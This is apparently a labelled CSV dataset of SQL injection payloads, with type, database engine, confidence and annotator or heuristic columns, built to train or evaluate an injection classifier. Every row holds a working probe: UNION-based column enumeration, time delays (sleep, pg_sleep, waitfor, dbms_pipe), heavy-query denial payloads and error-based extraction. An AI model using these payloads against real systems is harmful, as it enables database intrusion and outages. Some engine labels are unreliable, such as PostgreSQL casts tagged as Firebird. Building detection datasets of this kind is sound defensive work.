payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and 'eznq' like 'eznq",heavy_query,mysql,0.85,benchmark for heavy query,KEEP,,heavy_query,mysql,1865,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and 'eznq' like 'eznq"
1'|| ( select 'hwdj' where 8179 = 8179,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1866,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'|| ( select 'hwdj' where 8179 = 8179
1 ) as usnn where 3201 = 3201,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1867,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) as usnn where 3201 = 3201
select ( case when ( 9816 = 1693 ) then 9816 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,boolean_blind,generic,0.8,SELECT CASE WHEN for blind,KEEP,,boolean_blind,generic,1868,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,select ( case when ( 9816 = 1693 ) then 9816 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--
"1%"" ) and 8715 = 5529",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,1869,boolean_blind,generic,Pattern match: 'and 8715 = 5529' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","1%"" ) and 8715 = 5529"
"1 ) ) ) union all select null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1870,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) ) ) union all select null,null,null,null,null,null#"
"1 ) where 3076 = 3076 union all select null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1871,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) where 3076 = 3076 union all select null,null,null,null,null--"
"1"" ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ""liar"" = ""liar",boolean_blind,firebird,0.8,CHAR case when for blind,KEEP,,boolean_blind,firebird,1872,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,"1"" ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ""liar"" = ""liar"
1'+ ( select tzvm where 5145 = 5145 and 4192 = 7437#,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1873,boolean_blind,generic,Pattern match: 'and 4192 = 7437' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1'+ ( select tzvm where 5145 = 5145 and 4192 = 7437#
"1"" ) ) as ydkd where 2455 = 2455 and sleep ( 5 ) --",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1874,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1"" ) ) as ydkd where 2455 = 2455 and sleep ( 5 ) --"
"-4148%"" ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( ""%"" = """,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1875,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-4148%"" ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( ""%"" = """
1' or sleep ( 5 ) #,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1876,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,1' or sleep ( 5 ) #
-7239' or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and 'cswv' = 'cswv,boolean_blind,firebird,0.8,CHAR case when for blind,KEEP,,boolean_blind,firebird,1877,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,-7239' or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and 'cswv' = 'cswv
"1'|| ( select 'xhqy' where 4531 = 4531 union all select null,null--",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1878,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1'|| ( select 'xhqy' where 4531 = 4531 union all select null,null--"
"-6746"" ) or ( 8459 = 8459 ) *4906 and ( ""kohi"" like ""kohi",boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1879,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-6746"" ) or ( 8459 = 8459 ) *4906 and ( ""kohi"" like ""kohi"
"-6667%"" ) ) union all select 7348,7348,7348,7348,7348,7348,7348,7348#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1880,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6667%"" ) ) union all select 7348,7348,7348,7348,7348,7348,7348,7348#"
1'|| ( select 'yuku' where 7480 = 7480,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1881,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'|| ( select 'yuku' where 7480 = 7480
"1' ) union all select null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1882,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) union all select null,null,null,null--"
"-8319"" ) ) or 7878 = 5970 and ( ( ""jcaz"" like ""jcaz",boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1883,boolean_blind,generic,Pattern match: 'or 7878 = 5970' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-8319"" ) ) or 7878 = 5970 and ( ( ""jcaz"" like ""jcaz"
select case when 8975 = 2352 then 1 else null end--,boolean_blind,generic,0.8,SELECT CASE WHEN for blind,KEEP,,boolean_blind,generic,1884,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select case when 8975 = 2352 then 1 else null end--
"1%"" ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,1885,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1%"" ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
"1%' ) ) ) union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1886,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%' ) ) ) union all select null,null,null,null,null,null,null,null,null#"
"1' ) ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1887,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1' ) ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --"
"1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and 'hmqq' = 'hmqq",heavy_query,mysql,0.85,benchmark for heavy query,KEEP,,heavy_query,mysql,1888,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and 'hmqq' = 'hmqq"
waitfor delay '0:0:5' and ( ( 7619 = 7619,time_blind,mssql,0.9,waitfor delay MSSQL time blind,KEEP,,time_blind,mssql,1889,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,waitfor delay '0:0:5' and ( ( 7619 = 7619
1' ) where 4729 = 4729,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1890,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) where 4729 = 4729
"1"" where 9973 = 9973 and 2006 = 2006",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,1891,boolean_blind,generic,Pattern match: 'and 2006 = 2006' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","1"" where 9973 = 9973 and 2006 = 2006"
"-3954' ) ) union all select 2417,2417--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1892,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3954' ) ) union all select 2417,2417--"
"1' ) ) union all select null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1893,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) ) union all select null,null,null,null--"
1'+ ( select 'njee' where 4101 = 4101 and 3090 = 7873 ) +',boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1894,boolean_blind,generic,Pattern match: 'and 3090 = 7873' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1'+ ( select 'njee' where 4101 = 4101 and 3090 = 7873 ) +'
"-6593"" ) union all select 6216,6216,6216,6216,6216,6216,6216#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1895,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6593"" ) union all select 6216,6216,6216,6216,6216,6216,6216#"
"1"" ) and make_set ( 4539 = 6401,6401 ) and ( ""kglx"" = ""kglx",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1896,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1"" ) and make_set ( 4539 = 6401,6401 ) and ( ""kglx"" = ""kglx"
1' ) and 7290 = 8416 and ( 'ktlz' like 'ktlz,boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,1897,boolean_blind,generic,Pattern match: 'and 7290 = 8416' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1' ) and 7290 = 8416 and ( 'ktlz' like 'ktlz
"-8472' ) where 3340 = 3340 or make_set ( 1752 = 9905,9905 ) --",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1898,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-8472' ) where 3340 = 3340 or make_set ( 1752 = 9905,9905 ) --"
"1"" ) where 9770 = 9770 union all select null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1899,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) where 9770 = 9770 union all select null,null,null,null,null,null--"
"1'+ ( select ocvc where 6981 = 6981 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1900,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1'+ ( select ocvc where 6981 = 6981 union all select null,null,null,null,null,null,null,null,null,null#"
"1 ) ) union all select null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1901,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) ) union all select null,null,null,null,null,null,null--"
"-6214"" union all select 3323,3323#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1902,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6214"" union all select 3323,3323#"
-7979'+ ( select 'bkvt' where 3613 = 3613 union all select 3613#,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1903,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,-7979'+ ( select 'bkvt' where 3613 = 3613 union all select 3613#
select sleep ( 5 ) and ( ( 3404 = 3404,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1904,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,select sleep ( 5 ) and ( ( 3404 = 3404
1'|| ( select 'fjlg' from dual where 9517 = 9517,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1905,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,1'|| ( select 'fjlg' from dual where 9517 = 9517
"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1906,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--"
"1%"" ) union all select null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1907,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%"" ) union all select null--"
"1' or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and 'jiyx' = 'jiyx",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1908,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1' or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and 'jiyx' = 'jiyx"
"1%"" ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( ""%"" = """,error_based,oracle,0.85,xmltype for error extraction,KEEP,,error_based,oracle,1909,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,"1%"" ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( ""%"" = """
"-2085"" ) as hkev where 7730 = 7730 union all select 7730,7730--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1910,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2085"" ) as hkev where 7730 = 7730 union all select 7730,7730--"
1%' ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( '%' = ',boolean_blind,firebird,0.8,CAST for Firebird blind,KEEP,,boolean_blind,firebird,1911,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1%' ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( '%' = '
1 where 8398 = 8398,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1912,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 where 8398 = 8398
select ( case when ( 7096 = 2568 ) then 7096 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.8,SELECT CASE WHEN for blind,KEEP,,boolean_blind,generic,1913,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 7096 = 2568 ) then 7096 else 1/ ( select 0 ) end ) --
"1%' union all select null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1914,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%' union all select null,null,null,null,null,null,null#"
-1375' ) ) ) or ( 1226 = 9648 ) *9648 and ( ( ( 'kfoy' like 'kfoy,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1915,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,-1375' ) ) ) or ( 1226 = 9648 ) *9648 and ( ( ( 'kfoy' like 'kfoy
"-7868' in boolean mode ) union all select 5117,5117,5117,5117,5117,5117,5117,5117,5117#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1916,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7868' in boolean mode ) union all select 5117,5117,5117,5117,5117,5117,5117,5117,5117#"
"-3593%' union all select 6346,6346,6346,6346,6346,6346--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1917,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3593%' union all select 6346,6346,6346,6346,6346,6346--"
"-6093' ) where 9676 = 9676 union all select 9676,9676,9676,9676,9676,9676--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1918,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6093' ) where 9676 = 9676 union all select 9676,9676,9676,9676,9676,9676--"
-2891 where 1770 = 1770 or 9290 = 5866,boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,1919,boolean_blind,generic,Pattern match: 'or 9290 = 5866' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-2891 where 1770 = 1770 or 9290 = 5866
"-3562"" ) as eghl where 7094 = 7094 union all select 7094,7094,7094,7094#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1920,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3562"" ) as eghl where 7094 = 7094 union all select 7094,7094,7094,7094#"
"1'+ ( select rqcw where 9002 = 9002 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1921,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1'+ ( select rqcw where 9002 = 9002 union all select null,null,null,null,null,null,null,null,null#"
"1' ) union all select null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1922,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) union all select null,null,null,null,null,null--"
"1"" ) where 3679 = 3679",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1923,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) where 3679 = 3679"
-9225 ) or ( 8258 = 2726 ) *2726 and ( 9900 = 9900,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1924,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,-9225 ) or ( 8258 = 2726 ) *2726 and ( 9900 = 9900
select case when 9390 = 5752 then 1 else null end--,boolean_blind,generic,0.8,SELECT CASE WHEN for blind,KEEP,,boolean_blind,generic,1925,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select case when 9390 = 5752 then 1 else null end--
1' where 8099 = 8099,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1926,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' where 8099 = 8099
1' and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.9,pg_sleep for PostgreSQL time blind,KEEP,,time_blind,postgresql,1927,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,1' and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --
"1' ) ) as tfub where 3461 = 3461 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1928,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1' ) ) as tfub where 3461 = 3461 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --"
"1"" ) union all select null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1929,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) union all select null,null,null,null,null,null--"
"1"" ) ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ( ""whld"" = ""whld",error_based,mysql,0.85,extractvalue for error extraction,KEEP,,error_based,mysql,1930,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ( ""whld"" = ""whld"
"1"" where 8241 = 8241 union all select null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1931,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" where 8241 = 8241 union all select null,null,null#"
"-8841%"" ) or 4361 = 1910",boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1932,boolean_blind,generic,Pattern match: 'or 4361 = 1910' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-8841%"" ) or 4361 = 1910"
"1%"" and 9198 = 9198--",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,1933,boolean_blind,generic,Pattern match: 'and 9198 = 9198' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","1%"" and 9198 = 9198--"
"-5509%"" ) ) ) union all select 7066,7066,7066,7066,7066,7066,7066,7066,7066,7066--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1934,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5509%"" ) ) ) union all select 7066,7066,7066,7066,7066,7066,7066,7066,7066,7066--"
1 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ),time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1935,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1 and ( select * from ( select ( sleep ( 5 ) ) ) fzno )
"1'+ ( select cjcp where 2590 = 2590 union all select null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1936,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1'+ ( select cjcp where 2590 = 2590 union all select null,null,null,null,null,null,null#"
"1' and make_set ( 8403 = 8403,8899 )",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1937,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1' and make_set ( 8403 = 8403,8899 )"
"-3492"" where 4094 = 4094 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",boolean_blind,firebird,0.8,CAST for Firebird blind,KEEP,,boolean_blind,firebird,1938,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-3492"" where 4094 = 4094 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"
-6310 or 6715 = 3399,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1939,boolean_blind,generic,Pattern match: 'or 6715 = 3399' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-6310 or 6715 = 3399
"1"" ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""vkqt"" = ""vkqt",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,1940,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1"" ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""vkqt"" = ""vkqt"
